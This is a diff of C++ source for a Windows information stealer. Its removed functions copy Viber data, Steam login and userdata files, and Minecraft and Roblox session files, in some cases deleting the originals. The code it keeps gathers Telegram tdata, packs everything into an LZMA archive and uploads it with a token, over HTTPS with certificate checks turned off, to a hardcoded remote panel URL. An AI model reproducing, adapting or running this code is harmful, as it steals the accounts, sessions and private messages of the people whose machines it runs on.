@@ -288,115 +288,6 @@ void reg_tdata() {
     }
 }
 
-bool vbr = false;
-bool fvbr = false;
-#define VBR (!COPYVIBER || vbr || fvbr)
-void copy_viber() {
-    try {
-        GetEnvironmentVariableW(L"APPDATA", viber, MAX_PATH);
-        viber = wcscat(viber, L"\\ViberPC\\");
-        if (!fs::exists(viber)) { fvbr = true; return; }
-        reserveDelete(viber);
-        fs::copy(viber, getabspathincurrdir(L"tmp\\viber\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
-        if (DELORIGVIBER) fs::remove_all(viber);
-        vbr = true;
-    }
-    catch (fs::filesystem_error& e) {
-        fvbr = true;
-    }
-}
-
-bool mcr = false;
-bool fmcr = false;
-#define MCR (!COPYMINECRAFT || mcr || fmcr)
-void copy_minecraft() {
-    try {
-        GetEnvironmentVariableW(L"APPDATA", minecraft, MAX_PATH);
-        minecraft = wcscat(minecraft, L"\\.minecraft\\");
-        if (!fs::exists(minecraft)) { fmcr = true; return; }
-        reserveDelete(minecraft);
-        CreateDirectoryW(getabspathincurrdir(L"tmp\\minecraft\\").c_str(), NULL);
-        fs::copy(wstring(minecraft) + L"command_history.txt", getabspathincurrdir(L"tmp\\minecraft\\command_history.txt"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"servers.dat", getabspathincurrdir(L"tmp\\minecraft\\servers.dat"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"servers.dat_old", getabspathincurrdir(L"tmp\\minecraft\\servers.dat_old"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"TlauncherProfiles.json", getabspathincurrdir(L"tmp\\minecraft\\TlauncherProfiles.json"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"usercache.json", getabspathincurrdir(L"tmp\\minecraft\\usercache.json"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"usernamecache.json", getabspathincurrdir(L"tmp\\minecraft\\usernamecache.json"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"worlds.json", getabspathincurrdir(L"tmp\\minecraft\\worlds.json"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"baritone\\settings.txt", getabspathincurrdir(L"tmp\\minecraft\\baritone.settings.txt"), fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"Impact\\config\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
-        fs::copy(wstring(minecraft) + L"Impact\\presets\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config2\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
-        if (!DELORIGMINECRAFT) { mcr = true; return; }
-        fs::remove(wstring(minecraft) + L"command_history.txt");
-        fs::remove(wstring(minecraft) + L"servers.dat");
-        fs::remove(wstring(minecraft) + L"servers.dat_old");
-        fs::remove(wstring(minecraft) + L"TlauncherProfiles.json");
-        fs::remove(wstring(minecraft) + L"usercache.json");
-        fs::remove(wstring(minecraft) + L"usernamecache.json");
-        fs::remove(wstring(minecraft) + L"worlds.json");
-        fs::remove(wstring(minecraft) + L"baritone\\settings.txt");
-        fs::remove(wstring(minecraft) + L"Impact\\config\\");
-        fs::remove(wstring(minecraft) + L"Impact\\presets\\");
-        mcr = true;
-    }
-    catch (fs::filesystem_error& e) {
-        fmcr = true;
-    }
-}
-
-bool stm = false;
-bool fstm = false;
-#define STM (!COPYSTEAM || stm || fstm)
-void copy_steam() {
-    HKEY reg;
-    vector<unsigned char> data;
-    data.resize(MAX_PATH);
-    size_t spos = wstring::npos, epos = wstring::npos;
-    DWORD len = MAX_PATH;
-    DWORD type = REG_SZ;
-    if (RegOpenKeyExW(HKEY_CLASSES_ROOT, L"steam\\Shell\\Open\\Command", NULL, KEY_QUERY_VALUE, (PHKEY)&reg) != ERROR_SUCCESS) { fstm = true; return; }
-    if (RegQueryValueExW(reg, L"", NULL, &type, &data[0], &len) != ERROR_SUCCESS) { fstm = true; return; }
-    RegCloseKey(reg);
-    string command;
-    for (auto& d : data) { if ((unsigned short)d != 0) { command += d; } }
-    for (auto& disk : getdisks()) {
-        if ((spos = command.find_first_of(disk.string())) != string::npos) break;
-    }
-    if (!(spos != string::npos && (epos = command.find_last_of(".exe") - 1) != string::npos - 1)) { fstm = true; return; }
-    fs::path exepath = fs::path(command.substr(spos - 1, (epos - spos) + 3));
-    closeSelf(exepath.wstring().c_str());
-    reserveDelete(exepath);
-    try {
-        fs::copy(exepath.parent_path().wstring() + L"\\userdata\\", getabspathincurrdir(L"tmp\\steam.userdata\\"), fs::copy_options::overwrite_existing | fs::copy_options::recursive);
-        fs::copy(exepath.parent_path().wstring() + L"\\config\\loginusers.vdf", getabspathincurrdir(L"tmp\\steam.loginusers.vdf"), fs::copy_options::overwrite_existing);
-        if (!DELORIGSTEAM) { stm = true; return; }
-        fs::remove_all(exepath.parent_path().wstring() + L"\\userdata\\");
-        fs::remove(exepath.parent_path().wstring() + L"\\config\\loginusers.vdf");
-        stm = true;
-    }
-    catch (fs::filesystem_error& e) {
-        fstm = true;
-    }
-}
-
-bool rblx = false;
-bool frblx = false;
-#define RBLX (!COPYROBLOX || rblx || frblx)
-void copy_roblox() {
-    try {
-        GetEnvironmentVariableW(L"LOCALAPPDATA", roblox, MAX_PATH);
-        roblox = wcscat(roblox, L"\\Roblox\\");
-        if (!fs::exists(roblox)) { frblx = true; return; }
-        reserveDelete(roblox);
-        fs::copy(wstring(roblox) + L"LocalStorage\\", getabspathincurrdir(L"tmp\\roblox.LocalStorage\\"), fs::copy_options::overwrite_existing | fs::copy_options::recursive);
-        if (DELORIGROBLOX) fs::remove_all(wstring(roblox) + L"LocalStorage\\");
-        rblx = true;
-    }
-    catch (fs::filesystem_error& e) {
-        frblx = true;
-    }
-}
-
 void SetCurPos(int x, int y) {
     ifDebug({
         COORD c;
@@ -417,7 +308,7 @@ static size_t curl_data_write(void* contents, size_t size, size_t nmemb, void* u
 
 int wmain(int** argc, wchar_t* argv[])
 {
-    if (checkSelf(fs::path(argv[0]).filename().c_str()).size() > 1) { return 0; }
+    if (checkSelf(fs::path(argv[0]).filename().c_str()).size() > 1) { return -1; }
 
     ifDebug({
         _setmode(_fileno(stdout), 0x20000); //0x20000 is the same as _O_U16TEXT
@@ -426,7 +317,7 @@ int wmain(int** argc, wchar_t* argv[])
     });
     log_file.imbue(locale(".utf-8"));
 
-    if (PINGREQUIRED && system("ping -n 1 -w 500 google.com > nul") != 0) { return 0; }
+    if (PINGREQUIRED && system("ping -n 1 -w 500 google.com > nul") != 0) { return -1; }
 
     ifNDebug({ if (FreeConsole() == FALSE) return -1; });
 
@@ -502,38 +393,10 @@ int wmain(int** argc, wchar_t* argv[])
         cout(22, 9, BBLUE, DISABLED_STAT);
     }
 
-    cout(0, 10, FWHITE, L"Steal viber: ");
-    if (COPYVIBER) {
-        cout(22, 10, BYELLOW, STARTED_STAT);
-        thread th8{ copy_viber };
-        th8.detach();
-    } else { cout(22, 10, BBLUE, DISABLED_STAT); }
-
-    cout(0, 11, FWHITE, L"Steal minecraft: ");
-    if (COPYMINECRAFT) {
-        cout(22, 11, BYELLOW, STARTED_STAT);
-        thread th9{ copy_minecraft };
-        th9.detach();
-    } else { cout(22, 11, BBLUE, DISABLED_STAT); }
-
-    cout(0, 12, FWHITE, L"Steal steam: ");
-    if (COPYSTEAM) {
-        cout(22, 12, BYELLOW, STARTED_STAT);
-        thread th10{ copy_steam };
-        th10.detach();
-    } else { cout(22, 12, BBLUE, DISABLED_STAT); }
-
-    cout(0, 13, FWHITE, L"Steal roblox: ");
-    if (COPYROBLOX) {
-        cout(22, 13, BYELLOW, STARTED_STAT);
-        thread th11{ copy_roblox };
-        th11.detach();
-    } else { cout(22, 13, BBLUE, DISABLED_STAT); }
-
-    cout(0, 15, FWHITE, L"Archive: ");
-    cout(22, 15, BCYAN, WAITING_STAT);
-    cout(0, 16, FWHITE, L"Sending: ");
-    cout(22, 16, BCYAN, WAITING_STAT);
+    cout(0, 11, FWHITE, L"Archive: ");
+    cout(22, 11, BCYAN, WAITING_STAT);
+    cout(0, 12, FWHITE, L"Sending: ");
+    cout(22, 12, BCYAN, WAITING_STAT);
 
     do {
         if (idisks)  { cout(22, 3, BGREEN, OK_STAT); }
@@ -550,15 +413,7 @@ int wmain(int** argc, wchar_t* argv[])
         if (fdtdata) { cout(22, 8, BRED, FAIL_STAT); }
         if (tdata)   { cout(22, 9, BGREEN, OK_STAT); }
         if (ftdata)  { cout(22, 9, BRED, FAIL_STAT); }
-        if (vbr)     { cout(22, 10, BGREEN, OK_STAT); }
-        if (fvbr)    { cout(22, 10, BRED, FAIL_STAT); }
-        if (mcr)     { cout(22, 11, BGREEN, OK_STAT); }
-        if (fmcr)    { cout(22, 11, BRED, FAIL_STAT); }
-        if (stm)     { cout(22, 12, BGREEN, OK_STAT); }
-        if (fstm)    { cout(22, 12, BRED, FAIL_STAT); }
-        if (rblx)    { cout(22, 13, BGREEN, OK_STAT); }
-        if (frblx)   { cout(22, 13, BRED, FAIL_STAT); }
-    } while (!(IDISKS && IPC && IDLD && IDSK && CRM && DTDATA && RTDATA && VBR && MCR && STM && RBLX));
+    } while (!(IDISKS && IPC && IDLD && IDSK && CRM && DTDATA && RTDATA));
 
     if (idisks) { cout(22, 3, BGREEN, OK_STAT); }
     if (fidisks) { cout(22, 3, BRED, FAIL_STAT); }
@@ -574,17 +429,9 @@ int wmain(int** argc, wchar_t* argv[])
     if (fdtdata) { cout(22, 8, BRED, FAIL_STAT); }
     if (tdata) { cout(22, 9, BGREEN, OK_STAT); }
     if (ftdata) { cout(22, 9, BRED, FAIL_STAT); }
-    if (vbr) { cout(22, 10, BGREEN, OK_STAT); }
-    if (fvbr) { cout(22, 10, BRED, FAIL_STAT); }
-    if (mcr) { cout(22, 11, BGREEN, OK_STAT); }
-    if (fmcr) { cout(22, 11, BRED, FAIL_STAT); }
-    if (stm) { cout(22, 12, BGREEN, OK_STAT); }
-    if (fstm) { cout(22, 12, BRED, FAIL_STAT); }
-    if (rblx) { cout(22, 13, BGREEN, OK_STAT); }
-    if (frblx) { cout(22, 13, BRED, FAIL_STAT); }
 
     //   Archive
-    cout(22, 15, BYELLOW, STARTED_STAT);
+    cout(22, 11, BYELLOW, STARTED_STAT);
 
     archive* arc = archive_write_new();
     archive_write_set_compression_lzma(arc);
@@ -597,11 +444,11 @@ int wmain(int** argc, wchar_t* argv[])
     archive_write_close(arc);
     archive_write_free(arc);
 
-    cout(22, 15, BGREEN, OK_STAT);
+    cout(22, 11, BGREEN, OK_STAT);
     // ! Archive
 
     //   Send data
-    cout(22, 16, BYELLOW, STARTED_STAT);
+    cout(22, 12, BYELLOW, STARTED_STAT);
     CURL* curl = curl_easy_init();
     CURLcode res{};
 
@@ -622,14 +469,10 @@ int wmain(int** argc, wchar_t* argv[])
     curl_mime_data(field, "send", CURL_ZERO_TERMINATED);
 
     field = curl_mime_addpart(form);
-    curl_mime_name(field, "login");
-    curl_mime_data(field, LOGIN, CURL_ZERO_TERMINATED);
+    curl_mime_name(field, "token");
+    curl_mime_data(field, TOKEN, CURL_ZERO_TERMINATED);
 
-    field = curl_mime_addpart(form);
-    curl_mime_name(field, "password");
-    curl_mime_data(field, PASSWORD, CURL_ZERO_TERMINATED);
-
-    curl_opt(curl, CURLOPT_URL, URL);
+    curl_opt(curl, CURLOPT_URL, "https://web.141b.ru/panel/v1/uploadpc.php");
     curl_opt(curl, CURLOPT_MIMEPOST, form);
 
     curl_opt(curl, CURLOPT_SSL_VERIFYPEER, FALSE);
@@ -642,9 +485,9 @@ int wmain(int** argc, wchar_t* argv[])
 
     res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
-        cout(22, 16, BRED, FAIL_STAT);
-        cout(0, 17, FWHITE, L"Status: ");
-        cout(22, 17, BRED, (to_string(res) + " (" + curl_easy_strerror(res) + ")").c_str());
+        cout(22, 12, BRED, FAIL_STAT);
+        cout(0, 13, FWHITE, L"Status: ");
+        cout(22, 13, BRED, (to_string(res) + " (" + curl_easy_strerror(res) + ")").c_str());
         return -1;
     }
 
@@ -659,16 +502,15 @@ int wmain(int** argc, wchar_t* argv[])
 
     long response_code;
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-    cout(0, 17, FWHITE, L"Status: ");
-    cout(22, 17, (response_code < 400) ? BGREEN : BRED, (to_wstring(response_code) + L"(" + wtmp + L")").c_str());
-
+    cout(0, 13, FWHITE, L"Status: ");
+    cout(22, 13, (response_code < 400) ? BGREEN : BRED, (to_wstring(response_code) + L"(" + wtmp + L")").c_str());
 
     curl_easy_cleanup(curl);
     curl_mime_free(form);
-    cout(22, 16, (response_code < 400) ? BGREEN : BRED, ((response_code < 400) ? OK_STAT : FAIL_STAT));
+    cout(22, 12, (response_code < 400) ? BGREEN : BRED, ((response_code < 400) ? OK_STAT : FAIL_STAT));
 
     // ! Send data
 
-    system("pause>nul");
-    return 0;
+    if (ISDEBUG) { system("pause>nul"); }
+    return (response_code < 400)?0:-1;
 }
